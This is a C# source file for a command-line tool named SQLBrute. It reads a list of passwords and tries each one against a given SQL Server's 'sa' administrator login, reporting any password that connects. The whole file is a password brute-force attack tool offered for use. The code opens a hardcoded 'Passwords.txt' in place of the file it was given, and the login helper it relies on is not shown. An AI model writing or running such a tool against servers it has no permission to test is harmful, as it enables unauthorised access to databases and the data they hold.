using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SQLBrute
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                

                if (args.GetUpperBound(0) == 1)
                {
                    string server = args[0];
                    string passwordFile = args[1];

                    if (File.Exists(passwordFile))
                    {
                        System.IO.StreamReader file = new System.IO.StreamReader("Passwords.txt");
                        string line = "";

                        while ((line = file.ReadLine()) != null)
                        {
                            if (Helpers.ConnectToSQL(server, "sa", line))
                            {
                                Console.WriteLine(string.Format("Connection made to '{0}' with user sa and password '{1}'",server,line));
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine(string.Format("File '{0}' does not exist", passwordFile));
                    }
                }
                else
                {
                    Console.WriteLine("Usage: SQLBrute.exe SQLSERVER PASSWORDFILE");
                }
            }
            catch
            {
                Console.WriteLine("Usage: SQLBrute.exe SQLSERVER PASSWORDFILE");
            }
        }
    }
}

